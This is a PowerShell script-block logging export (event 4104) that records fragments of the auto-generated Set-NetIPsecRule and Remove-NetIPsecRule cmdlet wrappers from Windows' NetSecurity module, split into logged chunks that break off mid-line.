
    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('ByIPsecRuleName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Mode') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Mode})
        $__cmdletization_queryBuilder.FilterByProperty('Mode', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('InboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('InboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('OutboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${OutboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('OutboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${QuickModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('QuickModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase2AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase2AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase2AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('KeyModule') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${KeyModule})
        $__cmdletization_queryBuilder.FilterByProperty('KeyModule', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowWatchKey') -and (@('ByQuery') -contains

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (9 of 23):
esent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('User')) {
            [object]$__cmdletization_value = ${User}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Users'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Users'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Machine')) {
            [object]$__cmdletization_value = ${Machine}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Machines'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Machines'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalAddress')) {
            [object]$__cmdletization_value = ${LocalAddress}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteAddress')) {
            [object]$__cmdletization_value = ${RemoteAddress}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Protocol')) {
            [object]$__cmdletization_value = ${Protocol}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Protocol'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalPort')) {
            [object]$__cmdletization_value = ${LocalPort}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalPort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemotePort')) {
            [object]$__cmdletization_value = ${RemotePort}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemotePort'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('InterfaceAlias')) {
            [object]$__cmdletization_value = ${InterfaceAlias}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceAlias'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceAlias'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('InterfaceType')) {
            [object]$__cmdletization_value = ${InterfaceType}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetIPsecRule' -Alias '*'
        

function Remove-NetIPsecRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]

    param(
    
    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode[]]
    ${Mode},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecIn')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${InboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecOut')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule[]]
    ${KeyModule},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowWatchKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowSetKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${User},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Machine},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parame

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (8 of 23):
ValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Mode')) {
            [object]$__cmdletization_value = ${Mode}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Mode'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Mode'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('InboundSecurity')) {
            [object]$__cmdletization_value = ${InboundSecurity}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InboundSecurity'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InboundSecurity'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('OutboundSecurity')) {
            [object]$__cmdletization_value = ${OutboundSecurity}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OutboundSecurity'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OutboundSecurity'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet')) {
            [object]$__cmdletization_value = ${QuickModeCryptoSet}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickModeCryptoSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickModeCryptoSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Phase1AuthSet')) {
            [object]$__cmdletization_value = ${Phase1AuthSet}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase1AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase1AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Phase2AuthSet')) {
            [object]$__cmdletization_value = ${Phase2AuthSet}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase2AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase2AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('KeyModule')) {
            [object]$__cmdletization_value = ${KeyModule}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'KeyModule'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'KeyModule'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowWatchKey')) {
            [object]$__cmdletization_value = ${AllowWatchKey}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowWatchKey'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowWatchKey'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowSetKey')) {
            [object]$__cmdletization_value = ${AllowSetKey}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSetKey'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSetKey'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LocalTunnelEndpoint')) {
            [object]$__cmdletization_value = ${LocalTunnelEndpoint}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalTunnelEndpoint'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalTunnelEndpoint'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteTunnelEndpoint')) {
            [object]$__cmdletization_value = ${RemoteTunnelEndpoint}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteTunnelEndpoint'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteTunnelEndpoint'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname')) {
            [object]$__cmdletization_value = ${RemoteTunnelHostname}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteTunnelEndpointDNSName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteTunnelEndpointDNSName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('ForwardPathLifetime')) {
            [object]$__cmdletization_value = ${ForwardPathLifetime}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxReturnPathLifetimeSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxReturnPathLifetimeSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass')) {
            [object]$__cmdletization_value = ${EncryptedTunnelBypass}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BypassTunnelIfEncrypted'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BypassTunnelIfEncrypted'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RequireAuthorization')) {
            [object]$__cmdletization_value = ${RequireAuthorization}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequireAuthorization'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequireAuthorization'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPr

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (7 of 23):
Name='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [bool]
    ${AllowSetKey},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalTunnelEndpoint},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemoteTunnelEndpoint},

